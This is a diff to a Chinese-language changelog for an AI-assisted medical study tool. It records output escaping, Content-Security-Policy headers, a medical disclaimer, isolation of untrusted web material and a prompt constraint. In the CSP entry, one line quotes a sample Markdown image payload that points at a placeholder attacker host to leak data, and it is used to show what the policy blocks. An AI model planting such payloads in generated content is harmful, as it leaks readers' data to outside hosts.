@@ -78,6 +78,43 @@
 - **S3-18（R8+W）核心备份带回滚点**：核心备份原排除全部 `.bak`，连 `.pre-db-*.bak`（迁移/导入回滚点）
   一起丢掉；现只跳过 `-wal/-shm` 与 `.corrupt-*`（无恢复价值），保留真正的回滚点。
 
+### 内容安全与合规（Security / Fixed）
+
+- **S2-1（R8+W）渲染层两处未转义补齐**：`render_media` 的「图过大未嵌入」提示分支直接插值
+  `image_ref`（同函数另两个分支早已 `html_mod.escape`）→ 已转义；`export_md` 的 image_ref 原样进
+  Markdown（`[`/`]`/反引号/`|`/换行可破坏文档结构，且它来自上传文件名）→ 新增 `_md_escape_ref`，
+  只取 basename 并转义结构字符。
+- **S2-4（R8+W）补 CSP 与安全响应头**：
+  - **产物页**（题库/押题卷/复习手册）新增 `<meta http-equiv="Content-Security-Policy">`，
+    策略为**默认全禁**（`default-src 'none'`），只放行内联脚本/样式、`data:` 图片与
+    **同源连接**；即便题目内容里混入 `![](http://attacker/?leak)` 之类外部引用，浏览器也不会去加载。
+  - **应用侧**中间件新增 `Content-Security-Policy`（放行同源 + 内联，封死外部连接）、
+    `X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`。
+  - ⚠️ **`connect-src` 必须是 `'self'` 而不是 `'none'`**：首版按「产物是单文件零外部引用」
+    写了 `'none'`，结果押题卷判分后**回流错题到本机 API** 的功能（`fetch("/api/library/mistakes/sync-paper")`）
+    静默失效——由浏览器层用例 `test_paper_case_subquestions_sync_individually`
+    以 `TypeError: Failed to fetch` 抓出。已加守卫用例
+    `test_product_csp_matches_real_behavior`（把 CSP 口径与「产物里到底有没有 fetch」绑定）。
+- **S2-10（R8+W）补医学免责声明**：题库/复习手册等产物页页脚新增
+  「本页由 AI 辅助生成，仅供复习参考，**不能替代教材、指南与临床判断**；数值与结论请以现行
+  教材/指南为准，用药与诊疗决策务必核对原始出处」。
+- **S2-12（R8+W）冲突网络素材从「提示级」改为「结构级」隔离**：原实现把 conflict 条目与可信
+  条目混在同一个列表，只靠一句「conflict 条目不得作为正确答案依据」约束模型。现拆成两节：
+  可信素材在上，冲突素材单独成节并显式标注「**禁止**作为题干/答案依据」，同时在 run.log 留痕
+  冲突条数。程序级兜底：即便模型仍误用冲突素材数值，门禁① 的数值核验（S1-2）会要求正确选项的
+  临床数值能在**教材切片**里找到出处 → 误用会被判 fail 并交 MedFix 纠正。
+
+### Prompts
+
+> **NX-06 义务说明**：本版改动了 `medkit/prompts/medreview.md`。该 prompt **没有**对应的
+> `tests/fixtures/llm_cases/` 契约样本（现有样本为 medcards/medfix/medgen×3/medqc），
+> 故本次无需同步 fixtures；改动为**新增约束**（不改变输出契约的字段结构）。
+
+- **`prompts/medreview.md`**（S2-11 / R8+W）：`## 四、数字与标准速查` 一节新增硬性要求——
+  表格下必须紧跟一行 `> 上表数值以现行教材与最新指南为准，临床决策请复核原始出处。`
+  影响：复习手册产物的数值表不再被读者当作权威结论；输出结构不变（仅多一行引用块），
+  渲染层 `review_html` 的 Markdown 白名单已支持引用块。
+
 ### 供应链（Security / Fixed）
 
 - **S2-24（R8+W P1）starlette 升到 1.6.0**（原 1.2.1，低于 CVE-2026-54283 修复线 1.3.1）：
